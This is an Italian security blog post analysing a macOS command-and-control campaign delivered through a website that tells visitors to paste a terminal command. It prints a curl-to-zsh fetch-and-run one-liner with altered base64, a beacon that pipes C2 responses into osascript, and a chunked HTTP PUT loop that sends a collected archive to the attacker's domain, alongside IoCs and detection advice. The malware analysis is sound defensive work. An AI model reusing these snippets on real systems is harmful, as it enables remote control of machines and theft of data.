---
layout:     post
title:      "Analisi di un C2 per OSX"
date:       2026-02-17 09:00:00 +0100
categories: [cyber-security, hacking, ita]
image:      /assets/images-posts/screenshot-2026-02-17-at-13.04.13.png
---
Stavo cercando un documento in PDF per mio figlio, una delle tante ricerche, ed uno dei risultati di ricerca era questo sito (ancora online al momento della pubblicazione del post):

<img src="{{ '/assets/images-posts/image-6.png' | relative_url }}" alt="image 6" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Screenshot del 15 febbraio 2026

Chi è del mestiere, nel vedere un sito che ti dice di eseguire un comando sul tuo terminale, sente già puzza di bruciato. Visto che l'ambito lo studio delle tecniche di attacco fa parte dei miei interessi e del mio lavoro ho colto l'occasione per analizzare l'azione del bad-actor più in dettaglio.

> **Nota importante**: non fate prove a caso con il contenuto di questo post in quanto vengono discussi **payload veri** che, al momento della pubblicazione, sono ancora attivi.

#### Analisi del sito web

Prima di buttarci sul comando ha senso dare una sbirciata al sito web in questione: *datacloudhost4[dot]baby*. Dall'Italia risolve su 104.21.50.157 (CloudFlare) ed una banale verifica whois ci dice che questo sito .baby è praticamente un (quasi) baby-domain:

```
Domain Name: DATACLOUDHOST4.BABY
Registry Domain ID: D624431052-CNIC
Registrar WHOIS Server: whois.dynadot.com
Registrar URL: http://www.dynadot.com
Updated Date: 2025-12-24T06:59:34.0Z
Creation Date: 2025-12-24T06:58:24.0Z
Registry Expiry Date: 2026-12-24T23:59:59.0Z
Registrar: Dynadot LLC
Registrar IANA ID: 472
```

Il dominio esiste da meno di due mesi, questo probabilmente lo fa già uscire dai radar dei domini "troppo giovani" in quanto solitamente i sospetti scattano con domini che hanno meno di 30 giorni di vita, ma questo dipende anche dai livelli di paranoia.

---

Se trovi utili i miei post ed i miei video puoi supportare il mio progetto di divulgazione seguendomi sul blog o sul mio canale [**YouTube**](https://youtube.com/@roccosicilia) dove uscirà anche un video di approfondimento.

---

Analizzando il contenuto HTML uno dei riferimenti porta allo script "page-loader.js" che a differenza di altre componenti presenta commenti al codice JS con caratteri cirillici:

<img src="{{ '/assets/images-posts/image-7.png' | relative_url }}" alt="image 7" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Lo script in questione si occupa di gestire il contenuto del comando che viene riportato nel campo <input> prelevato direttamente dal file data.txt. È inoltre presenta la funzione che consente il "copy" del comando tramite il bottone "Copy command".

Si potrebbe approfondire di più sull'host, ma il richiamo della CLI è troppo forte :-)

#### Primo stage: il comando iniziale

```
echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg"
&& curl -kfsSL $(echo 'ZWNobyAnSW5zdG...'|base64 -D)|zsh
```

Intanto bisogna dire che il "copy" funziona e visto che ne ho trovati anche di non funzionanti possiamo dire che un minimo di cura anche nella delivery è stata messa. Altra nota importante: ho ovviamente modificato il contenuto del comando, in particolare la stringa base64 per evitare che qualche furbo si faccia compromettere la macchina facendo prove a caso (vedi nota iniziale).

I comando è molto semplice: esegue la *print* della stringa "Apple-Installer: https://apps.apple.com/hidenn-*[blablabla]*.dmg" sul terminale come se sia stata avviata l'installazione di un'App e successivamente esegue una combo di comandi:

```
curl -kfsSL $(echo 'ZWNobyAnSW5zdG...'|base64 -D)|zsh
```

Analizziamoli un pezzo alla volta e partiamo dall'**echo**. La sequenza mira a generare un valore che è il risultato della decodifica della stringa grazie al comando **base64 -D** (che su MacOS è il flag per la decodifica).

La conversione genera quindi un nuovo contenuto che possiamo analizzare a mano o, usando la shell, possiamo verificare il contenuto direttamente osservando l'output del comando facendo attenzione a non farlo eseguire:

<img src="{{ '/assets/images-posts/image-8.png' | relative_url }}" alt="image 8" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

<img src="{{ '/assets/images-posts/image-9.png' | relative_url }}" alt="image 9" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Dagli output si nota che l'intenzione del primo comando è eseguire il download di un contenuto appoggiato su un ulteriore sito web (durante l'analisi questo dominio è cambiato un paio di volte). Anche di questo contenuto si vorrebbe tentare l'esecuzione via **zsh**.

#### Secondo stage: drop del payload

Sempre facendo attenzione a cosa si fa possiamo eseguire il download del contenuto, usando ancora **curl** ed evitando di passare l'output a **zsh**:

<img src="{{ '/assets/images-posts/image-10.png' | relative_url }}" alt="image 10" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Questo output è più interessante del precedente: il contenuto è uno script che contiene un'altra stringa (?) *encoded* in base64 che viene passata come parametro al comando **gunzip**. Questo fa supporre che il contenuto in questione non sia una stringa ma la rappresentazione di uno zip file "encodata" in base64.

Apparentemente ciò che si sta tentando di fare è prendere un file in formato zip, estrarne il contenuto opportunamente *decoded*, metterlo in una variabile "**$d31228**" ed eseguirlo tramite il comando **eval**. Tralasciamo il riferimento con la stringa 'PAYLOAD_m..." come se non fosse evidente ciò che stiamo osservando.

Se rimuoviamo dallo script il comando eval otteniamo la generazione della variabile con il contenuto che ci interessa e possiamo visionarne il contenuto:

<img src="{{ '/assets/images-posts/image-11.png' | relative_url }}" alt="image 11" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Nota: nelle mie modifiche il **-D** diventa **-d** per conformare lo script a linux considerando che il bad-actor lo ha implementato per OSX.

Ora abbiamo il payload che si voleva eseguire e possiamo analizzarlo con calma.

#### Terzo stage: esecuzione del payload

Cosa fa lo script che abbiamo trovato? Non è nulla di complesso ma la cosa mi ha interessato in quanto mi capita di rado di lavorare su client OSX. Se siete poco avvezzi allo shell scripting - male - potete chiedere un aiuto ad un LLM che per questo tipo di compiti è un buon supporto. Ovviamente se siete figure tecniche del mondo IT o SEC e avete bisogno di un LLM per leggere uno script è bene che siate consapevoli del fatto che probabilmente avete un problema di competenze. Qui analizzo le parti più interessanti del payload.

Lo script è sostanzialmente identificato dalla funzione "daemon_function()" che viene poi richiamata nello stesso file per avviare un processo che gira silenziosamente sul sistema target.

```
exec </dev/null
exec >/dev/null
exec 2>/dev/null
```

Per prima cosa l'attaccante si preoccupa di evitare output di ogni tipo per evitare di rendere troppo visibile il processo che inevitabilmente sarà visibile almeno nella process list.

```
curl -k -s --max-time 30 \
    -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
    -H "api-key: $api_key" \
    "http://$domain/dynamic?txd=$token" | osascript
```

I comandi vengono prelevati dal C2 server tramite una http GET, metodo abbastanza classico che ho deciso di usare anche nel mio C2. Uno dei dettagli su cui mi è caduto l'occhio è l'impostazione di uno user-agent coerente con il sistema operativo. Mi è capitato di discutere con alcuni SOC team in merito ai metodi di rilevazione delle sessioni C2 ed un elemento che spesso viene preso in considerazione è lo user-agent delle sessione http: in presenza di dati insoliti o incoerenti un SIEM, opportunamente dotato di detection rules idonee, potrebbe intercettare payload meno curati di quello che stiamo analizzando sulla base dello user-agent impostato o non impostato dal bad-actor. Il contenuto della get viene passato ad **osascript** al fine di eseguire localmente i comandi impartiti.

```
[...]
    local file="/tmp/osalogging.zip"
[...]
    while (( i < total_chunks )); do
        local offset=$((i * CHUNK_SIZE))
        local chunk_size=$CHUNK_SIZE
        (( offset + chunk_size > total_size )) && chunk_size=$((total_size - offset))
        local success=0
        local attempt=1
        while (( attempt <= MAX_RETRIES && success == 0 )); do
            http_code=$(dd if="$file" bs=1 skip=$offset count=$chunk_size 2>/dev/null | \
                curl -k -s -X PUT \
                --data-binary @- \
                -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \
                -H "api-key: $api_key" \
                --max-time 180 \
                -o /dev/null \
                -w "%{http_code}" \
                "http://$domain/gate?buildtxd=$token&upload_id=$upload_id&chunk_index=$i&total_chunks=$total_chunks" 2>/dev/null)
            curl_status=$?
            if [[ $curl_status -eq 0 && $http_code -ge 200 && $http_code -lt 300 ]]; then
                success=1
            else
                ((attempt++))
                sleep $((3 + attempt * 2))
            fi
        done
        if (( success == 0 )); then
            return 1
        fi
        ((i++))
    done
```

Questa porzione di codice è un po' più articolata e si stratta del meccanismo di upload. Possiamo supporre che il bad-actor invii dei comandi che mirano poi ad archiviare gli output nel file **/tmp/osalogging.zip** che viene poi inviato via http PUT opportunamente diviso in chunk.

Sul piano tecnico trovo anche interessante la scelta di usare PUT come metodo di invio dei dati. Si tratta di una metodologia abbastanza inusuale visto il periodo storico e potrebbe essere una scelta fatta per semplificare estremamente la gestione della raccolta dei dati. Nel 2026 un client che fa sessione PUT verso un indirizzo insolito, anche se non malevolo, potrebbe essere considerata un'azione sospetta (IMHO).

#### IoC/BIoC

Abbiamo a disposizione un po' di elementi statici da considerare. Sicuramente vanno valutati i due indirizzi web che ho verificato su VirusTotal ed ho aggiunto il mio feedback:

<img src="{{ '/assets/images-posts/image-12.png' | relative_url }}" alt="image 12" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

<img src="{{ '/assets/images-posts/image-13.png' | relative_url }}" alt="image 13" style="float: left; width: 100%; max-width: 100%; margin-right: 20px; margin-bottom: 10px; border-radius: 4px;" />

Interessante notare che il secondo dominio, quello usato per l'hosting del payload ed il C2, non risultava segnalato da nessun vendor al momento dell'analisi.

Abbiamo poi lo script utilizzato per "droppare" il payload ed il payload stesso che, credo per recente fattura e bassa distribuzione, non ho trovato segnalato come malevolo. Considerando che si tratta di uno script molto adattabile e modificabile e, in questa versione, senza nessun tipo di offuscamento, non è strano che il suo hash non sia presente nei feeds e questo dovrebbe anche farci riflettere sulla necessità di disporre di sistemi di detection che non si basino solo sui feeds.

**Molto più interessanti i comportamenti individuati** come il metodo di beaconing ed exfiltration basato su traffico http usando chiamate GET e PUT e l'utilizzo di osascript. Su questo tema ho intenzione di dare qualche approfondimento sul lab che ho recentemente "aggiornato".

**<EDIT>** Sulla condivisione degli IoC sto ragionando sulla possibilità di dare accesso al mio archivio di dati che al momento sto gestendo tramite una istanza MISP che curo a mantengo personalmente. Su questo tema qualche tempo fa ho creato il [***canale #threat-int sul mio server Discord***](https://discord.com/invite/V3DB34DgHJ) dove eventualmente trovate aggiornamenti.

#### Conclusioni

Per intercettare questa tipologia di payload, considerando l'utilizzo di comando locali validi, è necessario disporre di strumenti di detection che siano in grado di raccogliere tutta la telemetria del sistema target e riconoscere il comportamento del processo che verrebbe avviato. È comunque da considerare che il dominio web utilizzato per ospitare la pagina web con il comando è già stato categorizzato come sospetto da diversi feeds, quindi è molto probabile che il tentativo di drop del malware venga intercettato con molto anticipo.

Va detto che questo non è l'unico metodo di delivery di un payload di questo tipo e la sua esecuzione apparirebbe ad un EDR come uno script lanciato dall'utente che gli analisti devono riuscire ad intercettare in mezzo al rumore di fondo di una rete aziendale spesso popolata da centinaia/migliaia di host su cui vengono avviati processi di ogni tipo.

Sul piano offensivo il payload è, ai miei occhi, una sostanziale conferma di un certo modus operandi. Nulla di nuovo e probabilmente anche migliorabile in merito a determinati aspetti.
